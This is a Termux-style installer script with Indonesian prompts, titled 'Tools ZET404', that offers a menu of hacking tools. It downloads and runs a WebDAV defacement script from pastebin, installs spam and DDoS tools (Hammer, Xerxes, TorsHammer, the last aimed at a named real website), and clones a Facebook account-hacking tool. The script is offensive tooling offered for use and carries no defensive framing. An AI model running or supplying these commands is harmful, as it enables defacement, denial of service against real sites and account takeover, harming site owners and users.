clear
echo "\033[34;1m Selamat datang di Tools ZET404" | lolcat
echo "\033[35;1m Tools Ini Masih Dalam Perkembangan Karena Masih Beta" | lolcat
echo "\033[36;1m Thanks To" | lolcat
echo "\033[32;1m All My Friends" | lolcat

echo "[1] Deface Webdav" | lolcat
echo "[2] LiteSpam" | lolcat
echo "[3] Ddos Hammer" | lolcat
echo "[4] Ddos Xerxes" | lolcat
echo "[5] TorsHammer" | lolcat
echo "[6] Lazymux" | lolcat
echo "[7] Hack FB" | lolcat
echo "[8] Install WPScan" | lolcat

echo "\033[35;1m Silahkan Di Pilih Yang Mau Di install | lolcat

read -p "ZET404" pilihan


if [ $pilihan = "1" ] || [ $pilihan = "1" ]
then
apt update && upgrade
apt install python2
pip2 install urllib3 chardet certifi idna requests
apt install openssl curl
pkg install libcurl
ln -s /sdcard
cd sdcard
mkdir webdav
cd webdav
curl -k -O https://pastebin.com/raw/HnVyQPtR
mv HnVyQPtR webdav.py
python2 webdav.py
cd
cd /sdcard/webdav
python2 webdav.py
fi

if [ $pilihan = "2" ] || [ $pilihan = "2" ]
then
apt update
apt upgrade
pkg install toilet
pkg install php
pkg install git
git clone https://github.com/4L13199/LITESPAM
cd LITESPAM
sh LITESPAM.sh
fi

if [ $pilihan = "3" ] || [ $pilihan = "3" ]
then
pkg update
pkg upgrade 
pkg install python
pkg install git
git clone https://github.com/cyweb/hammer 
cd hammer 
python hammer.py
python hammer.py -s
fi

if [ $pilihan = "4" ] || [ $pilihan = "4" ]
then
apt install git 
apt install clang 
git clone https://github.com/zanyarjamal/xerxes 
ls 
cd xerxes 
ls 
clang xerxes.c -o xerxes 
ls 
./xerxes 
fi

if [ $pilihan = "5" ] || [ $pilihan = "5" ]
then
pkg update 
pkg install git 
Pkg install tor 
pkg install python2 
git clone https://github.com/dotfighter/torshammer.git 
ls 
cd torshammer 
python2 torshammer.py -T -t seword.com 
fi

if [ $pilihan = "6" ] || [ $pilihan = "6" ]
then
apt update && apt upgrade
apt install git
git clone https://github.com/Gameye98/Lazymux
cd Lazymux
ls
python2 lazymux.py
fi 

if [ $pilihan = "7" ] || [ $pilihan = "7" ]
then
apt update && apt upgrade
pkg install python2 git
pip2 install mechanize
git clone https://github.com/pirmansx/mbf
ls
cd mbf
python2 MBF.py
fi

if [ $pilihan = "8" ] || [ $pilihan = "8" ]
then
apt update && apt upgrade
apt install git
apt install ruby
git clone https://github.com/wpscanteam/wpscan/
cd wpscan
chmod 777 wpscan.rb
gem install bundle
bundle install -j5
ruby wpscan.rb
fi

